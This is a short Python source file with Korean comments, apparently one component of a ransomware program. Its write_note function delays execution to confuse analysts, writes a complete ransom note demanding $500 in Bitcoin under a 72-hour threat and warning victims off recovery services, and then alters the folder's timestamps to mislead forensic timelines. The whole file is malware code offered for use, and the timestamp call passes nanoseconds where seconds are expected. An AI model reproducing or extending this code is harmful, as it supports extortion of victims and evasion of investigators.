from datetime import datetime, timezone, timedelta
import pytz
import time
import os
import random

def write_note(url):
    time.sleep(10)  #   파일 실행 후 코드가 실행되는 시간을 늦춤으로 혼란을 줌
    time_now = datetime.now(pytz.timezone('US/Eastern'))    #   미국 동부의 시간으로 시간 설정
    secret = int(time_now.timestamp() * 1e9)    #   나노초로 변환
    file_name = "Readme.txt"
    note = os.path.join(url, file_name) 
    with open(note, "w") as file:
        file.write("!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n")
        file.write("All your important files are encrypted with a strong algorithm. You will not be able to access your files without the decryption key.\n\n")
        file.write("To restore your files:\n")
        file.write("1. Do NOT attempt to delete or modify the encrypted files. This may result in permanent data loss.\n")
        file.write("2. You need to purchase the decryption key from us.\n\n")
        file.write("Payment Instructions:\n")
        file.write("- Send $500 worth of Bitcoin to the following address:\n")
        file.write("  [Bitcoin_Wallet_Address]\n")
        file.write("- After the payment is completed, send an email with your unique ID to: [attacker_email@example.com]\n\n")
        file.write("Your unique ID: [UNIQUE_ID]\n\n")
        file.write("Failure to comply within 72 hours will result in the permanent loss of your data.\n\n")
        file.write("Remember:\n")
        file.write("- Do NOT attempt to decrypt the files yourself.\n")
        file.write("- Do NOT contact any third-party recovery services as they will not help you.\n\n")
        file.write("We are the only ones who can help you recover your data.\n")
        file.write("\n[The Ransomware Team]")
    print(f"Randsome note created at {url}")

    os.utime(url, (secret, secret)) #   파일 생성 시간을 미국 동부 시간으로 설정(한국의 현재 시간과 다름)